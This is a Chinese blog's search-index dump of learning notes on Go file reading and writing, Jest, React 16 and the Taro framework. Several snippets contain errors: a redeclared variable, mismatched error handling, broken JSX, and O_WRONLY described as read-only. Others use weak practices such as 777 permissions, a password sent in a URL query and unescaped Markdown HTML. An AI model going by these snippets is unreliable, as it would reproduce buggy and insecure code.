err是判断是否读取到末尾，值为nil没读取到末尾，值为io.EOF读取到末尾\rif err == io.EOF {\rfmt.Printf(\u0026quot;读取完毕\u0026quot;)\rbreak\r}\rfmt.Printf(\u0026quot;读取到了%v 个字节 \\n\u0026quot;, n)\rvar strdata []byte\rstrdata := append(strdata, bytedata...)\rfmt.Println(string(strdata))\r}\r另一种读取方式（bufio，读取大文件推荐使用这个）\nfile, err := os.Open(\u0026quot;./data.txt\u0026quot;) // 读取文件\rdefer file.Close() // 关闭文件流\rif err != nil {\rfmt.Println(\u0026quot;打开文件出错\u0026quot;)\r}\rreader := bufio.NewReader(file)\rvar fileStr string\rvar count int = 0\rfor {\rstr, err := reader.ReadString('\\n')\rif err == io.EOF {\rfileStr += str\rfmt.Println(\u0026quot;读取结束\u0026quot;, count)\rbreak\r}\rif err != nil {\rfmt.Println(err)\rbreak\r}\rcount ++\rfileStr += str\r}\rfmt.Println(fileStr)\r读取小文件（ioutil）\nStrdata, err:= ioutil.ReadFile(\u0026quot;./data.txt\u0026quot;)\rif err != nil {\rfmt.Println(\u0026quot;打开文件出错\u0026quot;)\r}\rfmt.Println(string(Strdata))\r写入文件（os.OpenFile）\nfile, err := os.OpenFile(\u0026quot;./data.txt\u0026quot;, os.O_RDWR | os.O_APPEND, 777) // 打开文件\rdefer file.Close() // 关闭文件流\rif err != nil {\rfmt.Println(\u0026quot;打开文件出错\u0026quot;)\r}\rstr := \u0026quot;hallo word\u0026quot;\rfile.WriteString(str) // 写入文件\r这里os.OpenFile接收3个参数，分别是要打开的文件的路径，打开文件的模式（多个模式用|隔开），文件的权限（和Linux文件权限一样，用八进制表示，读（04），写（02），执行（01），一般为777或者755）\nos.O_WRONLY：只读 os.O_CREATE：创建 os.O_RDONLY：只读 os.O_RDWR：读写 os.O_TRUNC：清空 os.O_APPEND：追加\nbufio写入\nfile, err := os.OpenFile(\u0026quot;./main/test.txt\u0026quot;, os.O_RDWR | os.O_APPEND, 777) // 打开文件\rdefer file.Close()\rif err != nil {\rfmt.Println(\u0026quot;打开文件出错\u0026quot;)\r}\rwriter := bufio.NewWriter(file)\rwriter.WriteString(\u0026quot;hallo word\u0026quot;)\rwriter.Flush()\rioutil写入\nstr := \u0026quot;hallo word\u0026quot;\rioutil.WriteFile(\u0026quot;./data.txt\u0026quot;, []byte(str), 777)\r复制内容到文件\nStr, err := ioutil.ReadFile(\u0026quot;./data.txt\u0026quot;)\rif err != nil {\rfmt.Println(\u0026quot;读取文件出错\u0026quot;)\rreturn\r}\rioutil.WriteFile(\u0026quot;./data1.txt\u0026quot;, Str, 777)\r创建目录\nos.Mkdir(\u0026quot;./test\u0026quot;, 777)\n删除文件和目录\nos.Remove(\u0026quot;data1.txt\u0026quot;) // 删除文件\ros.Remove(\u0026quot;./test) // 删除目录\ros.RemoveAll(\u0026quot;./test1\u0026quot;) // 和Remove一样，不过这个会递归删除所有子目录和文件\r重命名\nfile := \u0026quot;./data.txt\u0026quot;\rerr1 := os.Rename(file,\u0026quot;test.txt\u0026quot;)\rif err1 != nil {\rpanic(err1)\r} else {\rfmt.Println(\u0026quot;文件重命名成功\u0026quot;)\r}\rfolder := \u0026quot;./demo\u0026quot;\rerr2 := os.Rename(folder, \u0026quot;demo1\u0026quot;)\rif err2 != nil {\rpanic(err1)\r} else {\rfmt.Println(\u0026quot;目录重命名成功\u0026quot;)\r}\r","permalink":"https://99999.fun/posts/96/","summary":"Golang又叫go语言，golang是它的全称，是由Google开发的一种静态强类型，编译型，并发型，并具有垃圾回收功能的编程语言\ngo语言确保达到静态编译语言的安全和性能的同时，又达到动态语言的开发维护效率\nGo语言天生支持并发，提供自动垃圾回收机制\ngo的源文件是xxx.go\n值得一提的是哔哩哔哩网站后端就是用golang开发，这个足以说明golang的并发功能有多强大了\n检查是否安装成功go\ngo version\n环境配置\nGOROOT对应着go的安装目录\nGOPATH对应着go的源代码目录（可以放多个目录）\nGOBIN对应着 go install安装和编译的二进制程序的安装目录\n检查go环境\ngo env\n源程序默认为UTF-8编码，;可省略\n第一个go程序\npackage main\rimport \u0026quot;fmt\u0026quot;\rfunc main(){\rfmt.Println(\u0026quot;hallo golang\u0026quot;)\r}\rgo run hallo.go\n当然作为一个编译型语言，编译成二进制文件是支持的\ngo build hallo.go\n作为一个静态强类型语言，如果学过java的话，理解还是很轻松的\n定义包 package : 必须在源程序上声明该文件是属性那个包的\n引入包 import : 导入包，引用外部包开扩展功能\n注释\n// 单行\n/* 多 行 */\n标识符命名规范：第一个字母必须是字母或者下划线，而且不能是关键字，特殊符号只支持下划线\n常用的数据类型有：\n整型：int（有符号），uint（无符号），rune，int/unint(8,16,32,64)\n浮点型：float(32,64)，comple\n布尔型：bool（true，false）（bool默认值为false）\n字符串型：string\n数组：array\n结构体：struct\n变量\nvar abc string = \u0026ldquo;hallo\u0026rdquo;\n注意：如果声明变量了，但是没有初始化，那个该变量的值为系统默认设置的值（零值）\n定义多个变量\nvar abc xyz string = \u0026ldquo;hallo\u0026rdquo;,\u0026ldquo;word\u0026rdquo;","title":"Golang学习笔记"},{"content":"Jest是Facebook开源的一套JavaScript测试框架\n安装\n在项目中安装\nyarn add \u0026ndash;dev jest或者npm install \u0026ndash;save-dev jest\n全局安装\nyarn global add jest\nhello.js\nmodule.exports = function(){\rreturn \u0026quot;hello world\u0026quot;\r}\rhello.test.js\nconst hello = require('../hello')\rit('should ', () =\u0026gt; {\rexpect(hello()).toBe('hello world')\r})\rpackage.json\n{\r\u0026quot;scripts\u0026quot;: {\r\u0026quot;test\u0026quot;: \u0026quot;jest\u0026quot;\r}\r}\r执行测试\nyarn test或者npm run test\nexspect() //运行结果\ntoBe() //期待的结果\nnot.toBe() //判断不等\ntoBeNull() //判断是否为NULL\ntoBeUndefined() //判断是否为undefined\ntoBeDefined() //判断是否为undefined取反\ntoBeTruthy() //判断结果为true\ntoBeFalsy() //判断结果为false\ntoBeGreaterThan(5) //判断结果是否大于5\ntoBeLessThan(5) //判断结果是否小于5\ntoBeGreaterThanOrEqual(6) //判断结果是否大于等于6\ntoBeLessThanOrEqual(6) //判断结果是否小于等于6\ntoBeCloseTo(3.14) //判断结果是否相等于3.14浮点数\ntoMatch() //判断结果正则表达式\ntoContain() //判断是否包含\nJest默认使用require引用（CommonJS），而使用import的话会报错，因此需要babel工具来将其转换为CommonJS\n当然需要安装babel\nyarn add @babel/core@7.4.5 @babel/preset-env@7.4.5 \u0026ndash;dev\n新建.babelrc文件（babel转换配置文件）\n{\r\u0026quot;presets\u0026quot;:[\r[\r\u0026quot;@babel/preset-env\u0026quot;,{\r\u0026quot;targets\u0026quot;:{\r\u0026quot;node\u0026quot;:\u0026quot;current\u0026quot;\r}\r}\r]\r]\r}\r","permalink":"https://99999.fun/posts/95/","summary":"Jest是Facebook开源的一套JavaScript测试框架\n安装\n在项目中安装\nyarn add \u0026ndash;dev jest或者npm install \u0026ndash;save-dev jest\n全局安装\nyarn global add jest\nhello.js\nmodule.exports = function(){\rreturn \u0026quot;hello world\u0026quot;\r}\rhello.test.js\nconst hello = require('../hello')\rit('should ', () =\u0026gt; {\rexpect(hello()).toBe('hello world')\r})\rpackage.json\n{\r\u0026quot;scripts\u0026quot;: {\r\u0026quot;test\u0026quot;: \u0026quot;jest\u0026quot;\r}\r}\r执行测试\nyarn test或者npm run test\nexspect() //运行结果\ntoBe() //期待的结果\nnot.toBe() //判断不等\ntoBeNull() //判断是否为NULL\ntoBeUndefined() //判断是否为undefined\ntoBeDefined() //判断是否为undefined取反\ntoBeTruthy() //判断结果为true\ntoBeFalsy() //判断结果为false\ntoBeGreaterThan(5) //判断结果是否大于5\ntoBeLessThan(5) //判断结果是否小于5\ntoBeGreaterThanOrEqual(6) //判断结果是否大于等于6","title":"简单使用Jest-JavaScript测试工具"},{"content":"react16是Facebook在2017年发布的react版本，几乎对react底层进行重写，但是对外API不变，因此可以无缝转移到react16\nrender返回类型\n除了只能返回单个元素外，react16支持返回字符串和数组（由react元素组成）\n例如：\nrender(){\rreturn[\r\u0026lt;div\u0026gt;hallo\u0026lt;/div\u0026gt;,\r\u0026lt;div\u0026gt;word\u0026lt;/div\u0026gt;\r]\r}\r或者\nrender(){\rreturn \u0026quot;hallo word\u0026quot;\r}\r错误处理\nreact16引入了新的错误处理机制，当组件发生错误，将会将其从组件树中卸载，避免引起整个应用的崩溃\n当然也提供了更友好的处理方式，叫错误边界，这个会捕获子组件的错误，并且输出错误日志和出错提示，例如：\ncomponentDidCatch(error, info){\rconsole.log(error,info)\r}\rPortals\nReact16的Portals特性可以将组件渲染到当前组件树以外的DOM树上，例如弹框\nReactDOM.createPortal(child, container)\n第一个参数是可以被渲染的react节点，第二个参数是dom元素，react节点将会被挂载到该DOM元素上\n自定义DOM属性\n在react16之前，会忽略不识别的属性，而在react16之后，会将不识别的属性传递给dom元素\nReact AJAX（搭配jQuery）\n通过componentDidMount()调用，通过componentWillUnmount()取消未完成的请求\nVirtual-DOM实质上就是模拟DOM树结构，通过JavaScript对象来描述DOM对象，通过映射成真实的DOM节点来实现\n对于DOM节点数据更新，则通过生成一个新的Virtual-DOM，两个Virtual-DOM通过Diff算法进行差异更新，将更新处理为真实的DOM\nVirtual-DOM的优势：减少操作DOM，处理视图和状态的关系\n没有任何框架能比原生DOM处理快，但是操作原生DOM可能导致浏览器的回流（回流是性能第一杀手），因此在复杂视图下，原生DOM操作就可能没有Virtual-DOM性能好了\nreact-markdown是react官方提供的库，专门用来解析md文件或者符合md语法的变量\n安装react-markdown\nyarn add react-markdown\n导入\nimport ReactMarkdown from \u0026lsquo;react-markdown\u0026rsquo;\n测试\nlet markdown =\r\u0026quot;**这是加粗的文字**\\n\\n\u0026quot; +\r\u0026quot;*这是倾斜的文字*`\\n\\n\u0026quot; +\r\u0026quot;***这是斜体加粗的文字***\\n\\n\u0026quot; +\r\u0026quot;~~这是加删除线的文字~~ \\n\\n\u0026quot; +\r\u0026quot;`console.log(111)` \\n\\n\u0026quot; +\r\u0026quot;``` var a=11; ```\u0026quot;;\r\u0026lt;ReactMarkdown source={markdown} escapeHtml={false} children={markdown}/\u0026gt;\r","permalink":"https://99999.fun/posts/94/","summary":"react16是Facebook在2017年发布的react版本，几乎对react底层进行重写，但是对外API不变，因此可以无缝转移到react16\nrender返回类型\n除了只能返回单个元素外，react16支持返回字符串和数组（由react元素组成）\n例如：\nrender(){\rreturn[\r\u0026lt;div\u0026gt;hallo\u0026lt;/div\u0026gt;,\r\u0026lt;div\u0026gt;word\u0026lt;/div\u0026gt;\r]\r}\r或者\nrender(){\rreturn \u0026quot;hallo word\u0026quot;\r}\r错误处理\nreact16引入了新的错误处理机制，当组件发生错误，将会将其从组件树中卸载，避免引起整个应用的崩溃\n当然也提供了更友好的处理方式，叫错误边界，这个会捕获子组件的错误，并且输出错误日志和出错提示，例如：\ncomponentDidCatch(error, info){\rconsole.log(error,info)\r}\rPortals\nReact16的Portals特性可以将组件渲染到当前组件树以外的DOM树上，例如弹框\nReactDOM.createPortal(child, container)\n第一个参数是可以被渲染的react节点，第二个参数是dom元素，react节点将会被挂载到该DOM元素上\n自定义DOM属性\n在react16之前，会忽略不识别的属性，而在react16之后，会将不识别的属性传递给dom元素\nReact AJAX（搭配jQuery）\n通过componentDidMount()调用，通过componentWillUnmount()取消未完成的请求\nVirtual-DOM实质上就是模拟DOM树结构，通过JavaScript对象来描述DOM对象，通过映射成真实的DOM节点来实现\n对于DOM节点数据更新，则通过生成一个新的Virtual-DOM，两个Virtual-DOM通过Diff算法进行差异更新，将更新处理为真实的DOM\nVirtual-DOM的优势：减少操作DOM，处理视图和状态的关系\n没有任何框架能比原生DOM处理快，但是操作原生DOM可能导致浏览器的回流（回流是性能第一杀手），因此在复杂视图下，原生DOM操作就可能没有Virtual-DOM性能好了\nreact-markdown是react官方提供的库，专门用来解析md文件或者符合md语法的变量\n安装react-markdown\nyarn add react-markdown\n导入\nimport ReactMarkdown from \u0026lsquo;react-markdown\u0026rsquo;\n测试\nlet markdown =\r\u0026quot;**这是加粗的文字**\\n\\n\u0026quot; +\r\u0026quot;*这是倾斜的文字*`\\n\\n\u0026quot; +\r\u0026quot;***这是斜体加粗的文字***\\n\\n\u0026quot; +\r\u0026quot;~~这是加删除线的文字~~ \\n\\n\u0026quot; +\r\u0026quot;`console.log(111)` \\n\\n\u0026quot; +\r\u0026quot;``` var a=11; ```\u0026quot;;\r\u0026lt;ReactMarkdown source={markdown} escapeHtml={false} children={markdown}/\u0026gt;\r","title":"React进阶学习笔记"},{"content":"Taro是京东凹凸实验室推出的一个框架，设计目的是多端统一开发解决方案，一次开发，多端运行\nTaro可以使用React/Vue等前端框架开发的，当然typescript肯定是支持\nTaro官方文档：https://taro-docs.jd.com/taro/docs/README\nTaro官方组件库：https://taro-ui.jd.com/\nTaro支持微信小程序，百度小程序，支付宝小程序，字节小程序，QQ轻应用，ReactNatvie等等\nTaro 1.2支持将已有的微信小程序进行转换，只需要在项目根目录运行taro convert命令就可以在将现有的小程序项目转换到taroConvert目录下，转换成jsx代码，并且可以直接使用这个代码来进行taro build来编译成taro支持的平台应用\n安装Taro框架\nnpm install -g @tarojs/cli\n或者\nyarn global add @tarojs/cli\n升级框架\ntaro update self\n创建项目\ntaro init hallo\n创建h5项目\nyarn dev:h5\n创建微信小程序项目\nyarn dev:weapp\n创建完毕会在dist目录下生成小程序程序\n支付宝小程序 yarn dev:alipay\n百度小程序 yarn dev:swan\nReactNative yarn dev:rn\n编译完成的端源码在dist目录下\n作为一个可以使用react规范开发的框架，React Hooks和jsx也是支持的\nTaro组件化（Taro可以使用react开发，因此也具备react的组件化功能）\nimport Taro, { useState } from '@tarojs/taro'\rimport { View, Text } from '@tarojs/components'\rimport './index.less'\rfunction Main(){\rconst [count ,setUserName] = useState(\u0026quot;hallo word\u0026quot;)\rreturn ( \u0026lt;View\u0026gt;\r\u0026lt;Text\u0026gt;{count}\u0026lt;/Text\u0026gt;\r\u0026lt;/View\u0026gt;\r)\r}\rexport default Main\r子组件\nimport { View, Text } from '@tarojs/components'\rfunction Data(){\rreturn ( \u0026lt;View\u0026gt;\u0026lt;Text\u0026gt;hallo word\u0026lt;/Text\u0026gt;\u0026lt;/View\u0026gt;\r)\r}\rexport default Data\r如果使用类组件的话，需要导入Component基础类，并且类组件需要继承该基础类，例如：\nimport Taro, { Component } from '@tarojs/taro'\rclass Data extends Component{\rconfig = {\rnavigationBarTitleText: 'hallo word'\r}\rrender(){\rreturn ( \u0026lt;View\u0026gt;\u0026lt;Text\u0026gt;hallo word\u0026lt;/Text\u0026gt;\u0026lt;/View\u0026gt;\r)\r}\r}\rexport default Data\r导入\nimport Data from \u0026lsquo;./data.jsx\u0026rsquo;\n直接在父组件中使用就好\n父组件传递参数给子组件\n学过react都知道，父组件传递参数给子组件要通过props接收，因此子组件要加props参数\nfunction Data(props){\rreturn ( \u0026lt;View\u0026gt;\u0026lt;Text\u0026gt;{props.count}\u0026lt;/Text\u0026gt;\u0026lt;/View\u0026gt;\r)\r}\rexport default Data\rTaro路由（通过app.jsx的pages，谁在第一个数组的值，那么该就是默认打开的首页）\ntaro路由是自带的，只需要在app.js入口文件配置config.pages（pages是数组），就可以使用taro的api来访问路由，例如：\npages: [\r'pages/main/main',\r'pages/data/data'\r],\r注意，不需要导入页面，Taro可以自动化完成\nTaro 提供了6个路由api，分别是\nnavigateTo：记录上级页面，可以返回上级页面\nredirectTo：不记录上级页面\nswitchTab：Tab之间进行切换\nnavigateBack：返回上一级页面\ngetCurrentPages：获取当前页面信息（页面栈），注意h5不支持\nrelaunch：销毁所有页面（关闭）\n注意：微信小程序存在五层页面限制，要合理使用navigateTo和redirectTo\n路由配合页面之间传递参数\n发送参数\n例如：\nimport Taro ,{useState} from '@tarojs/taro'\rimport {View , Text ,Button} from '@tarojs/components'\rfunction Main(){\rconst [data,setData] = useState(\u0026quot;hallo\u0026quot;)\rconst UrlIndex=()=\u0026gt;{\rTaro.navigateTo({url:'/pages/index/index'+data})\r}\rreturn (\r\u0026lt;View\u0026gt;\r\u0026lt;Text\u0026gt;hallo word\u0026lt;/Text\u0026gt;\r\u0026lt;Button onClick={UrlIndex}\u0026gt;GO\u0026lt;/Button\u0026gt;\r\u0026lt;/View\u0026gt;\r)\r}\rexport default Main\r只需要在Index.jsx下接收就可，例如：\nimport Taro, { useState ,useEffect } from '@tarojs/taro'\r...\rconst [data,setData] = useState('')\ruseEffect(()=\u0026gt;{\rsetData(this.$router.params.data)\r},[])\r...\r\u0026lt;Text\u0026gt;{data}\u0026lt;/Text\u0026gt;\r多参数传递也是可以\nconst [data,setData] = useState(\u0026quot;hallo\u0026quot;)\rconst [name,setName] = useState(\u0026quot;root\u0026quot;)\rconst [pass,setPass] = useState(\u0026quot;123\u0026quot;)\rconst UrlIndex=()=\u0026gt;{\rTaro.navigateTo({url:'/pages/index/index?data='+data+'\u0026amp;name='+name+'\u0026amp;pass='+pass})\r}\r接收多参数\nconst [data,setData] = useState('')\rconst [name,setName] = useState('')\rconst [pass,setPass] = useState('')\ruseEffect(()=\u0026gt;{\rsetData(this.$router.params.data)\rsetName(this.$router.params.name)\rsetPass(this.$router.params.pass)\r},[])\r...\r\u0026lt;Text\u0026gt;{data}\u0026lt;/Text\u0026gt;\r\u0026lt;Text\u0026gt;{name}\u0026lt;/Text\u0026gt;\r\u0026lt;Text\u0026gt;{pass}\u0026lt;/Text\u0026gt;\r导入静态资源\nimport Taro ,{useState ,useEffect}from '@tarojs/taro'\rimport {View , Text ,Button, Image} from '@tarojs/components'\rimport {imgdata,cssdata} from '../../data' // 导入方法（函数）\rimport logo from '../../img/1.jpg' // 导入静态资源\ruseEffect(()=\u0026gt;{\rimgdata()\rcssdata()\r},[])\r...\r\u0026lt;Image src={newbbd} width=\u0026quot;300px\u0026quot; height=\u0026quot;300px\u0026quot; /\u0026gt;\r或者\n\u0026lt;Image src={require('../../img/1.jpg')} width=\u0026quot;300px\u0026quot; height=\u0026quot;300px\u0026quot; /\u0026gt;\r请求远程端口\nconst testData= ()=\u0026gt;{\rTaro.request({\rurl:'https://xxx.xxx/xxx'\r}).then(mainData=\u0026gt;{\rconsole.log(mainData.data)\r})\r}\rurl是目标接口，then()是请求完毕获取到的数据\n生命周期与state\nTaro支持react的生命周期，另外Taro还为小程序补充了一些react不存在的生命周期，方便Taro开发小程序时使用\n组件的生命周期\nclass Test extends Component{\rconstructor (props) {\r// constructor会在组件挂载（组件渲染到Taro虚拟DOM之前）之前被执行\rsuper(props)\rthis.state = {\rdata: 'admin'\r}\r}\rcomponentWillMount (){\rconsole.log('第一次渲染之前执行') // 组件被装载渲染之前执行\r}\rcomponentDidMount(){\rconsole.log('第一次渲染之后执行') // 组件被装载渲染之后执行\rthis.setState({ data: 'root' }) // 修改state状态，需要通过setState方法来修改，而不是直接修改\r}\rcomponentWillUnmount(){\rconsole.log('组件被销毁或者被卸载时执行')\r}\rcomponentWillUpdate(){\rconsole.log('state数据更新前执行') // 当组件接收到新的state或者props，该钩子会在渲染之前执行，其中也可以接收2个参数，nextProps, nextState\r}\rcomponentDidUpdate(){\rconsole.log('state数据更新后执行') // 当发送更新时执行。第一次渲染不会被触发\r}\rshouldComponentUpdate(nextProps, nextState){\r// 表示该组件不受state状态或者props影响，通过返回值来表示是否在每次state状态更新时重新渲染，默认返回true\r// 该钩子函数接收2个参数，分别是nextProps, nextState，分别表示最新的props和state\rconsole.log(nextProps, nextState)\rreturn false\r}\rcomponentWillReceiveProps(nextProps){\rconsole.log('Props参数发生改变之前执行') // 当已被装载渲染的组件接收到新的props属性之前执行，nextProps参数表示最新的props属性\r}\rgetSnapshotBeforeUpdate(){\rconsole.log('在最近一次渲染之前执行') // 可用来组件渲染之前捕获数据\r}\rrender(){\rreturn(\r\u0026lt;View\u0026gt;\r\u0026lt;Text\u0026gt;hallo word {this.state.data}\u0026lt;/Text\u0026gt;\r\u0026lt;/View\u0026gt;\r)\r}\r}\rTaro Props（父子组件通信）\n子组件\nexport default class DataTest extends Component{\rrender(){\rlet {data} = this.props\rreturn(\r\u0026lt;View\u0026gt;\rhallo {data}\r\u0026lt;/View\u0026gt;\r)\r}\r}\r父组件\nimport DataTest from './datatest'\rexport default class Test extends Component{\rconstructor (props) {\rsuper(props)\rthis.state = {\rdata: 'admin'\r}\r}\rrender(){\rlet {data} = this.state.data\rreturn(\r\u0026lt;View\u0026gt;\r\u0026lt;Text\u0026gt;hallo word\u0026lt;/Text\u0026gt;\r\u0026lt;DataTest data={data}/\u0026gt;\r\u0026lt;/View\u0026gt;\r)\r}\r}\rprops默认值\nDataTest.defaultProps = {\rdata: 'user'\r}\r注意：当props为undefined时，才将读取defaultProps的值作为props\n条件渲染\n三元表达式\n{\rtrue?\u0026lt;div\u0026gt;hallo wrod\u0026lt;/div:\u0026lt;div\u0026gt;hhh\u0026lt;/div\u0026gt;\r}\r短路表达式\n{\r!true||\u0026lt;div\u0026gt;hallo wrod\u0026lt;/div\u0026gt;\r}\r列表渲染\nstate = {\rlist: [\r{id:1,name:'root'},\r{id:2,name:'abc'},\r{id:3,name:'test'}\r]\r}\r...\rlet {list} = this.state\r...\r{\rlist.map((item, index) =\u0026gt;{\rreturn(\u0026lt;div key={index}\u0026gt;{item.name}\u0026lt;/div\u0026gt;)\r})\r}\rchildren传入组件\nexport default class Test extends Component{\rrender(){\rreturn(\r\u0026lt;View\u0026gt;\r{\rthis.props.texts\r}\r{\rthis.props.children\r}\r\u0026lt;/View\u0026gt;\r)\r}\r}\r调用的时候，直接在父组件使用就可以\nreturn(\r\u0026lt;View\u0026gt;\r\u0026lt;Test texts={\u0026lt;div\u0026gt;hallo wrod\u0026lt;/div\u0026gt;}\u0026gt;\u0026lt;/Test\u0026gt;\r\u0026lt;Test\u0026gt;hallo 123\u0026lt;/Test\u0026gt;\r\u0026lt;Test\u0026gt;hallo 666\u0026lt;/Test\u0026gt;\r\u0026lt;/View\u0026gt;\r)\r注意：不要对this.props.children进行任何操作，taro在小程序实现这个功能是利用了插槽Slot功能，而且this.props.children不能使用defaultProps进行设置默认，也不能拆分成变量进行使用，但是允许通过props自定义属性的方式传入组件\n事件处理\nstate = {\rname: 'root'\r}\rtest(){\rconsole.log(this.state.name)\r}\rrender(){\rreturn(\r\u0026lt;View\u0026gt;\r\u0026lt;Button onClick={this.test.bind(this)\u0026gt;\u0026lt;/Button\u0026gt;\r\u0026lt;/View\u0026gt;\r)\r}\rtaro事件函数有个默认参数，event，它指向该事件的具体，可通过event.stopPagenation()来阻止当前事件的事件冒泡\n注意：taro的全部事件需要用on开头（而且组件传入参数是函数，这个函数也必须是on开头命名的），是为了小程序（因为小程序会认为是字符串），如果不做小程序可以忽略\ntaro判断当前环境是h5还是小程序（只限制开发环境，生产环境是无效的）\nconst ish5 = process.env.TARO_ENV == 'h5'\rif(ish5){\rrequire('./h5.less')\r}else{\rrequire('./noh5.less')\r}\r布局推荐使用flex布局\n在taro应用typescript\n为非ts项目安装ts依赖\nnpm install typescript \u0026ndash;save\n还需要配置tsconfig.json\n{\r\u0026quot;compilerOptions\u0026quot;: {\r\u0026quot;target\u0026quot;: \u0026quot;es2017\u0026quot;,\r\u0026quot;module\u0026quot;: \u0026quot;commonjs\u0026quot;,\r\u0026quot;removeComments\u0026quot;: false,\r\u0026quot;preserveConstEnums\u0026quot;: true,\r\u0026quot;moduleResolution\u0026quot;: \u0026quot;node\u0026quot;,\r\u0026quot;experimentalDecorators\u0026quot;: true,\r\u0026quot;jsxFactory\u0026quot;: \u0026quot;Taro.createElement\u0026quot;,\r\u0026quot;noImplicitAny\u0026quot;: false,\r\u0026quot;allowSyntheticDefaultImports\u0026quot;: true,\r\u0026quot;outDir\u0026quot;: \u0026quot;lib\u0026quot;,\r\u0026quot;noUnusedLocals\u0026quot;: true,\r\u0026quot;noUnusedParameters\u0026quot;: true,\r\u0026quot;strictNullChecks\u0026quot;: true,\r\u0026quot;sourceMap\u0026quot;: true,\r\u0026quot;baseUrl\u0026quot;: \u0026quot;.\u0026quot;,\r\u0026quot;rootDir\u0026quot;: \u0026quot;.\u0026quot;,\r\u0026quot;jsx\u0026quot;: \u0026quot;preserve\u0026quot;,\r\u0026quot;typeRoots\u0026quot;: [\r\u0026quot;node_modules/@types\u0026quot;,\r\u0026quot;global.d.ts\u0026quot;\r]\r},\r\u0026quot;compileOnSave\u0026quot;: false\r}\r如果是新建项目，可以在初始化时指定需要使用typescript\n编译ts文件完成，也是放到dist目录下\n","permalink":"https://99999.fun/posts/92/","summary":"Taro是京东凹凸实验室推出的一个框架，设计目的是多端统一开发解决方案，一次开发，多端运行\nTaro可以使用React/Vue等前端框架开发的，当然typescript肯定是支持\nTaro官方文档：https://taro-docs.jd.com/taro/docs/README\nTaro官方组件库：https://taro-ui.jd.com/\nTaro支持微信小程序，百度小程序，支付宝小程序，字节小程序，QQ轻应用，ReactNatvie等等\nTaro 1.2支持将已有的微信小程序进行转换，只需要在项目根目录运行taro convert命令就可以在将现有的小程序项目转换到taroConvert目录下，转换成jsx代码，并且可以直接使用这个代码来进行taro build来编译成taro支持的平台应用\n安装Taro框架\nnpm install -g @tarojs/cli\n或者\nyarn global add @tarojs/cli\n升级框架\ntaro update self\n创建项目\ntaro init hallo\n创建h5项目\nyarn dev:h5\n创建微信小程序项目\nyarn dev:weapp\n创建完毕会在dist目录下生成小程序程序\n支付宝小程序 yarn dev:alipay\n百度小程序 yarn dev:swan\nReactNative yarn dev:rn\n编译完成的端源码在dist目录下\n作为一个可以使用react规范开发的框架，React Hooks和jsx也是支持的\nTaro组件化（Taro可以使用react开发，因此也具备react的组件化功能）\nimport Taro, { useState } from '@tarojs/taro'\rimport { View, Text } from '@tarojs/components'\rimport './index.less'\rfunction Main(){\rconst [count ,setUserName] = useState(\u0026quot;hallo word\u0026quot;)\rreturn ( \u0026lt;View\u0026gt;\r\u0026lt;Text\u0026gt;{count}\u0026lt;/Text\u0026gt;\r\u0026lt;/View\u0026gt;\r)\r}\rexport default Main\r子组件","title":"Taro框架学习笔记"},{"content":"Taro是京东凹凸实验室推出的一个脚手架，设计目的是多端统一开发解决方案，一次开发，多端运行\nTaro可以使用React/Vue等前端框架开发的，当然typescript肯定是支持\nTaro官方文档：https://taro-docs.jd.com/taro/docs/README\nTaro支持微信小程序，百度小程序，支付宝小程序，字节小程序，QQ轻应用，ReactNatvie等等\n安装Taro脚手架\nnpm install -g @tarojs/cli\n或者\nyarn global add @tarojs/cli\n升级脚手架工具\ntaro update self\n创建项目\ntaro init hallo\n创建h5项目\nyarn dev:h5\n创建微信小程序项目\nyarn dev:weapp\n创建完毕会在dist目录下生成小程序程序\n作为一个可以使用react开发的脚手架，React Hooks和jsx也是支持的\nTaro组件化（Taro可以使用react开发，因此也具备react的组件化功能）\nimport Taro, { useState } from '@tarojs/taro'\rimport { View, Text } from '@tarojs/components'\rimport './index.less'\rfunction Main(){\rconst [count ,setUserName] = useState(\u0026quot;hallo word\u0026quot;)\rreturn ( \u0026lt;View\u0026gt;\r\u0026lt;Text\u0026gt;{count}\u0026lt;/Text\u0026gt;\r\u0026lt;/View\u0026gt;\r)\r}\rexport default Main\r子组件\nimport { View, Text } from '@tarojs/components'\rfunction Data(){\rreturn ( \u0026lt;View\u0026gt;\u0026lt;Text\u0026gt;hallo word\u0026lt;/Text\u0026gt;\u0026lt;/View\u0026gt;\r)\r}\rexport default Data\r导入\nimport Data from \u0026lsquo;./data.jsx\u0026rsquo;\n直接在父组件中使用就好\n父组件传递参数给子组件\n学过react都知道，父组件传递参数给子组件要通过props接收，因此子组件要加props参数\nfunction Data(props){\rreturn ( \u0026lt;View\u0026gt;\u0026lt;Text\u0026gt;{props.count}\u0026lt;/Text\u0026gt;\u0026lt;/View\u0026gt;\r)\r}\rexport default Data\rTaro路由（通过app.jsx的pages，谁在第一个数组的值，那么该就是默认打开的首页）\npages: [\r'pages/main/main',\r'pages/data/data'\r],\r注意，不需要导入页面，Taro可以自动化完成\nTaro 提供了6个路由api，分别是\nnavigateTo：记录上级页面，可以返回上级页面\nredirectTo：不记录上级页面\nswitchTab：Tab之间进行切换\nnavigateBack：返回上一级页面\ngetCurrentPages：获取当前页面信息（页面栈），注意h5不支持\nrelaunch：销毁所有页面（关闭）\n路由配合页面之间传递参数\n发送参数\n例如：\nimport Taro ,{useState} from '@tarojs/taro'\rimport {View , Text ,Button} from '@tarojs/components'\rfunction Main(){\rconst [data,setData] = useState(\u0026quot;hallo\u0026quot;)\rconst UrlIndex=()=\u0026gt;{\rTaro.navigateTo({url:'/pages/index/index'+data})\r}\rreturn (\r\u0026lt;View\u0026gt;\r\u0026lt;Text\u0026gt;hallo word\u0026lt;/Text\u0026gt;\r\u0026lt;Button onClick={UrlIndex}\u0026gt;GO\u0026lt;/Button\u0026gt;\r\u0026lt;/View\u0026gt;\r)\r}\rexport default Main\r只需要在Index.jsx下接收就可，例如：\nimport Taro, { useState ,useEffect } from '@tarojs/taro'\r...\rconst [data,setData] = useState('')\ruseEffect(()=\u0026gt;{\rsetData(this.$router.params.data)\r},[])\r...\r\u0026lt;Text\u0026gt;{data}\u0026lt;/Text\u0026gt;\r多参数传递也是可以\nconst [data,setData] = useState(\u0026quot;hallo\u0026quot;)\rconst [name,setName] = useState(\u0026quot;root\u0026quot;)\rconst [pass,setPass] = useState(\u0026quot;123\u0026quot;)\rconst UrlIndex=()=\u0026gt;{\rTaro.navigateTo({url:'/pages/index/index?data='+data+'\u0026amp;name='+name+'\u0026amp;pass='+pass})\r}\r接收多参数\nconst [data,setData] = useState('')\rconst [name,setName] = useState('')\rconst [pass,setPass] = 